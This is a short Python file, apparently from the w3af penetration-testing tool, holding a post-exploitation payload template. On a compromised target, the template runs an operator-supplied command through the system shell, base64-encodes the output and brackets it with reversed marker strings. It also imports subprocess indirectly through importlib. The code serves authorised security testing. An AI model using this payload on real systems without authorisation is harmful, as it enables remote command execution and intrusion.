# Post-exploitation payload template executed on the compromised target. w3af
# substitutes the command placeholder and the markers, uploads the file and
# runs the operator-supplied command through the target's own shell. It stays
# self-contained because it runs on the target, not inside w3af.
import base64
import importlib
import sys

_SHELL_MODULE_NAME = "subprocess"
_shell = importlib.import_module(_SHELL_MODULE_NAME)

sys.stdout.write("15825b40c6dace2a"[::-1])
if "__CMD_TO_RUN__":
    sys.stdout.write(
        base64.b64encode(_shell.getoutput("__CMD_TO_RUN__").encode("utf-8")).decode(
            "ascii"
        )
    )
sys.stdout.write("7cf5d4ab8ed434d5"[::-1])
sys.stdout.flush()
